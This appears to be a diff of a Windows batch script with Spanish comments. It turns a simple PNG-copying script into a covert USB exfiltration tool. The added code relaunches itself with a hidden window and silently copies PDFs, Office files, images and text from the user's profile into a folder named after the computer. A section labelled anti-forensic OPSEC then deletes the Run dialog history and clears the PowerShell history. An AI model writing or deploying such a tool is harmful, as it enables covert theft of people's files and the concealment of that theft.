@@ -1,41 +1,49 @@
 @echo off
 
-:: ====================================================
-::               BLOQUE DE CONFIGURACION
-:: ====================================================
-:: Cambia estos parametros segun tus necesidades:
-
-set "NOMBRE_USB=Nyx"
-set "ORIGEN=D:\"
-set "FILTRO=*.png"
-
-:: ====================================================
-
-
 :: Ejecutarse en segundo plano si no lo esta
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
     exit
 )
 
-:: Buscar la letra de la unidad USB por su etiqueta
-for /f "delims=" %%D in ('powershell -NoProfile -Command "(Get-Volume | Where-Object {$_.FileSystemLabel -eq '%NOMBRE_USB%'}).DriveLetter"') do (
-    set DRIVE=%%D
+:: ====================================================
+::               BLOQUE DE CONFIGURACION
+:: ====================================================
+:: Directorio origen por defecto: Directorio del usuario actual (%USERPROFILE%)
+:: (Cubre Escritorio, Documentos, Descargas, Imagenes, etc.)
+set "ORIGEN=%USERPROFILE%"
+
+:: Extensiones a extraer (separadas por coma)
+set "FILTROS=*.pdf,*.docx,*.xlsx,*.png,*.jpg,*.txt"
+
+:: Tamano maximo por archivo en MB (evita saturar la memoria USB)
+set "MAX_SIZE_MB=25"
+
+:: ====================================================
+::               RESOLUCION DINAMICA DE UNIDAD
+:: ====================================================
+set "USB_ROOT=%~dp0"
+set "FOLDER_DATA=%USB_ROOT%Data"
+
+if exist "%USB_ROOT%..\..\Data" (
+    set "FOLDER_DATA=%USB_ROOT%..\..\Data"
 )
 
-:: Si no encuentra la USB con ese nombre, aborta el script
-if "%DRIVE%"=="" exit
+set "FOLDER_TARGET=%FOLDER_DATA%\%COMPUTERNAME%_data"
 
-:: Definir la ruta raiz de la USB y la subcarpeta Data
-set "DESTINO=%DRIVE%:\"
-set "FOLDER_DATA=%DESTINO%Data"
-
-:: COMPROBACION: Si la carpeta Data no existe en la USB, la crea
-if not exist "%FOLDER_DATA%" (
-    mkdir "%FOLDER_DATA%"
+if not exist "%FOLDER_TARGET%" (
+    mkdir "%FOLDER_TARGET%" 2>nul
 )
 
-:: Copia masiva unificada usando las variables de configuracion
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$fotos = Get-ChildItem -Path '%ORIGEN%' -Recurse -File -Filter '%FILTRO%'; foreach ($foto in $fotos) { Copy-Item -Path $foto.FullName -Destination '%FOLDER_DATA%' -Force }"
+:: ====================================================
+::               EXTRACCION INTELIGENTE
+:: ====================================================
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$src = '%ORIGEN%'; $dest = '%FOLDER_TARGET%'; $max = [long]%MAX_SIZE_MB% * 1MB; $exts = '%FILTROS%'.Split(','); foreach ($ext in $exts) { Get-ChildItem -Path $src -Filter $ext.Trim() -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -le $max } | ForEach-Object { $destFile = Join-Path $dest ($_.Directory.Name + '_' + $_.Name); Copy-Item -Path $_.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue } }"
+
+:: ====================================================
+::               LIMPIEZA ANTI-FORENSE (OPSEC)
+:: ====================================================
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1
 
 exit
